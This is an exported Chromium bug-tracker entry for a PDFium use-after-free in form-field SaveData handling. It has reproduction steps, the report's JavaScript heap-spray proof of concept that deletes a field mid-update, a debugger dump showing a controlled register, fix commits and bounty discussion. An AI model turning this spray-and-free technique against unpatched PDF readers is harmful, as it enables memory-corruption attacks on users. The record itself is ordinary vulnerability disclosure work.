# Use-after-free in CFFL_TextField::SaveData 

| Field | Value |
|-------|-------|
| **Issue ID** | [40088733](https://issues.chromium.org/issues/40088733) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ma...@gmail.com |
| **Assignee** | rh...@chromium.org |
| **Created** | 2017-08-17 |
| **Bounty** | $6,500.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36

Steps to reproduce the problem:
1. Build pdfium with XFA + ASAN
2. Put |test.pdf| and |test.evt| in the same folder.
3. Run ./pdfium_test --send-events ./test.pdf

What is the expected behavior?

What went wrong?
To simulate click and typing on a Textbox, I'm using --send-events to do that. It's a feature in |pdfium_test.cc|

Please look at file named "test.evt".

As I explained at https://bugs.chromium.org/p/chromium/issues/detail?id=737023

If we have 2 widgets on 2 different pages, then we can call |OnFormat| Action when invoking |ResetFieldAppearance| or |UpdateField|.

At https://cs.chromium.org/chromium/src/third_party/pdfium/fpdfsdk/formfiller/cffl_textfield.cpp?q=cffl_textfield.cpp&sq=package:chromium&dr&l=143

It invokes both, so what if I delete the annot right at middle of |ResetFieldAppearance|, then 144th line calls |UpdateField| with |m_pWidget| pointer which has been freed. UAF occurs.

Why I have to simulate user interactive action cuz |pdfium_test.cc| can not focus on an annot if it exists on 2 various pages. I also explained this at https://bugs.chromium.org/p/chromium/issues/detail?id=737023#c10

------------

There are 2 widgets (MyField) on 2 pages 0 & 1

OnFormat AAction:

    function spray() {
    gc();
    spray_array = new Array(0x20000);
    for (var i = 0 ; i < 10000 ; i++)
    {
        spray_array[i] = new Uint32Array(0x300);
        for (var j = 0; j < spray_array[i].length ; j++ )
        {
            spray_array[i][j] = 0x41414141;
        }
    }
    return spray_array;
    }
    this.baseURL+="1";
    if(this.baseURL == "11"){
      this.removeField("MyField");
      spray();
    }

------------

Did this work before? N/A 

Chrome version: 60.0.3112.90  Channel: n/a
OS Version: OS X 10.12.6
Flash Version:

## Attachments

- [asan](attachments/asan) (text/plain, 12.3 KB)
- [test.evt](attachments/test.evt) (application/octet-stream, 32 B)
- [test.in](attachments/test.in) (application/octet-stream, 2.3 KB)
- [test.pdf](attachments/test.pdf) (application/pdf, 3.2 KB)
- [combo.evt](attachments/combo.evt) (application/octet-stream, 32 B)
- [combo.pdf](attachments/combo.pdf) (application/pdf, 3.5 KB)
- [combo_asan](attachments/combo_asan) (text/plain, 10.2 KB)
- [combo.in](attachments/combo.in) (application/octet-stream, 2.4 KB)
- [combo.pdf](attachments/combo_53234919.pdf) (application/pdf, 3.2 KB)
- [Screen Shot 2017-10-12 at 16.57.15.png](attachments/Screen Shot 2017-10-12 at 16.57.15.png) (image/png, 248.1 KB)

## Timeline

### el...@chromium.org (2017-08-17)

[Empty comment from Monorail migration]

[Monorail components: Internals>Plugins>PDF]

### th...@chromium.org (2017-08-17)

[Empty comment from Monorail migration]

### rs...@chromium.org (2017-08-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-08-22)

[Empty comment from Monorail migration]

### ds...@chromium.org (2017-08-22)

Does this repro with XFA off? The report says build with XFA, but then it mentions FormFiller, which is non-XFA?

### ma...@gmail.com (2017-08-22)

Hey,

You may want to check my previous reports, 

It works only for xfa, because non-xfa build can not delete an annot instantly

### ds...@chromium.org (2017-08-22)

Removing security impact, XFA is not enabled on any branch of chrome.

### ma...@gmail.com (2017-08-30)

And please notice that if XFA would be shipped to Chrome in future, it's would be possible to trigger the bug without user interaction.

### ma...@gmail.com (2017-09-15)

Hi folks, any updates for this ? 

### th...@chromium.org (2017-09-15)

We definitely want to fix this within a reasonable amount of time, but since we are not shipping XFA, it's sitting a bit further down on the list.

### ds...@chromium.org (2017-09-19)

[Empty comment from Monorail migration]

### rh...@chromium.org (2017-10-05)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-10-05)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/1a45ce380ec6776ac100017c68a4b8643983d2db

commit 1a45ce380ec6776ac100017c68a4b8643983d2db
Author: Ryan Harrison <rharrison@chromium.org>
Date: Thu Oct 05 18:31:36 2017

Add ObservedPtrs to catch issues in SaveData

BUG=chromium:756427

Change-Id: I90c7065ec5a467cb954cdf3e1d6954a0b0655d4e
Reviewed-on: https://pdfium-review.googlesource.com/15630
Commit-Queue: Ryan Harrison <rharrison@chromium.org>
Reviewed-by: Tom Sepez <tsepez@chromium.org>
Reviewed-by: Henrique Nakashima <hnakashima@chromium.org>

[modify] https://crrev.com/1a45ce380ec6776ac100017c68a4b8643983d2db/fpdfsdk/formfiller/cffl_textfield.cpp
[modify] https://crrev.com/1a45ce380ec6776ac100017c68a4b8643983d2db/fpdfsdk/formfiller/cffl_interactiveformfiller.cpp


### rh...@chromium.org (2017-10-05)

[Empty comment from Monorail migration]

### ma...@gmail.com (2017-10-05)

Hi, 

The fix seems fine, but it doesn't cover all of |SaveData| on each type of CPWL.

This one triggers UAF in |CFFL_ComboBox::SaveData|



### ma...@gmail.com (2017-10-05)

[Comment Deleted]

### bu...@chromium.org (2017-10-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d4e1b8bcc5cfd9038eb81b4d5d79b724d505c0c2

commit d4e1b8bcc5cfd9038eb81b4d5d79b724d505c0c2
Author: pdfium-deps-roller@chromium.org <pdfium-deps-roller@chromium.org>
Date: Thu Oct 05 21:06:24 2017

Roll src/third_party/pdfium/ 4ce4f5f8a..480ca10f7 (12 commits)

https://pdfium.googlesource.com/pdfium.git/+log/4ce4f5f8ab0b..480ca10f7a20

$ git log 4ce4f5f8a..480ca10f7 --date=short --no-merges --format='%ad %ae %s'
2017-10-05 dsinclair Remove unused CPVT_SecProps
2017-10-05 dsinclair Remove more unused params
2017-10-05 dsinclair Remove unused parameters
2017-10-05 rharrison Add ObservedPtr to catch Widget being killed by JS
2017-10-05 rharrison Add ObservedPtrs to catch issues in SaveData
2017-10-05 npm Create FreeType roll script
2017-10-04 rharrison Make GIF decoder more standards complaint
2017-10-05 dsinclair Move CPDF_RenderOptions members to private
2017-10-05 dsinclair Remove friend from CPDF_ApSettings
2017-10-05 npm Roll FT to ae7dc1f62d826083d418e86cce3f66a76dff038a
2017-10-05 dsinclair Remove friends from form code
2017-10-05 dsinclair Remove friends from CPDF_VariableText

Created with:
  roll-dep src/third_party/pdfium
BUG=771979,756427,770337


Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, see:
http://www.chromium.org/developers/tree-sheriffs/sheriff-details-chromium#TOC-Failures-due-to-DEPS-rolls


TBR=dsinclair@chromium.org

Change-Id: I875e810e00b7d619534e2dc24519c27088423e15
Reviewed-on: https://chromium-review.googlesource.com/703198
Reviewed-by: <pdfium-deps-roller@chromium.org>
Commit-Queue: <pdfium-deps-roller@chromium.org>
Cr-Commit-Position: refs/heads/master@{#506857}
[modify] https://crrev.com/d4e1b8bcc5cfd9038eb81b4d5d79b724d505c0c2/DEPS


### sh...@chromium.org (2017-10-06)

[Empty comment from Monorail migration]

### ma...@gmail.com (2017-10-12)

This PoC controls %eax register, and can leverage to take control eip as well.

Tested on 32-bit `pdfium_test` on macOS;

Fixes are at: https://pdfium.googlesource.com/pdfium/+/1886471c3432dee4d9a9be5678a757dde8717652

-------

Process 49218 launched: '../out_pdfium_mac/debug32/pdfium_test' (i386)
Rendering PDF file ../report_bugs/8/combo.pdf.
Using event file ../report_bugs/8/combo.evt.
Sending events from: ../report_bugs/8/combo.evt
LoadXFA unsuccessful, continuing anyway.
Alert: 1
pdfium_test`CPDFSDK_InterForm::GetInterForm:
->  0xb22806 <+38>: mov    eax, dword ptr [eax]
    0xb22808 <+40>: add    esp, 0x18
    0xb2280b <+43>: pop    ebp
    0xb2280c <+44>: ret

Process 49218 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x61616169)
    frame #0: 0x00b22806 pdfium_test`CPDFSDK_InterForm::GetInterForm() const [inlined] std::__1::unique_ptr<CPDF_InterForm, std::__1::default_delete<CPDF_InterForm> >::get(this=0x61616169) const at memory:2519
   2516	  }
   2517	  _LIBCPP_INLINE_VISIBILITY
   2518	  pointer get() const _NOEXCEPT {
-> 2519	    return __ptr_.first();
   2520	  }
   2521	  _LIBCPP_INLINE_VISIBILITY
   2522	  deleter_type& get_deleter() _NOEXCEPT {
Target 0: (pdfium_test) stopped.
(lldb) register read
General Purpose Registers:
       eax = 0x61616169
       ebx = 0x02e14b40
       ecx = 0x61616169
       edx = 0x02d0de28
       edi = 0x02e14b40
       esi = 0x00000001
       ebp = 0xbfffe2c8
       esp = 0xbfffe2b0
        ss = 0x00000023
    eflags = 0x00010282  pdfium_test`(anonymous namespace)::RenderPage(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, void*, void*, (anonymous namespace)::FPDF_FORMFILLINFO_PDFiumTest*, int, (anonymous namespace)::Options const&, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&) + 5202 [inlined] std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >::__get_pointer() const + 92 at string:1129
  pdfium_test`(anonymous namespace)::RenderPage(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, void*, void*, (anonymous namespace)::FPDF_FORMFILLINFO_PDFiumTest*, int, (anonymous namespace)::Options const&, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&) + 5110 [inlined] std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >::data() const at string:1127
  pdfium_test`(anonymous namespace)::RenderPage(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, void*, void*, (anonymous namespace)::FPDF_FORMFILLINFO_PDFiumTest*, int, (anonymous namespace)::Options const&, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&) + 5110 [inlined] std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >::c_str() const at pdfium_test.cc:1320
  pdfium_test`(anonymous namespace)::RenderPage(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, void*, void*, (anonymous namespace)::FPDF_FORMFILLINFO_PDFiumTest*, int, (anonymous namespace)::Options const&, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&) + 5110 at pdfium_test.cc:1320
       eip = 0x00b22806  pdfium_test`CPDFSDK_InterForm::GetInterForm() const + 38 [inlined] std::__1::unique_ptr<CPDF_InterForm, std::__1::default_delete<CPDF_InterForm> >::get() const + 11 at cpdfsdk_interform.h:37
  pdfium_test`CPDFSDK_InterForm::GetInterForm() const + 27 at cpdfsdk_interform.h:37
        cs = 0x0000001b
        ds = 0x00000023
        es = 0x00000023
        fs = 0x00000000
        gs = 0x0000000f

(lldb)

### aw...@google.com (2018-01-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-01-12)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-01-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-01-22)

Groovy! The VRP Panel decided to reward $6,500 for these bugs. Thanks!

### aw...@chromium.org (2018-01-22)

[Empty comment from Monorail migration]

### is...@google.com (2018-01-22)

This issue was migrated from crbug.com/chromium/756427?no_tracker_redirect=1

[Monorail blocking: crbug.com/chromium/62400]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088733)*
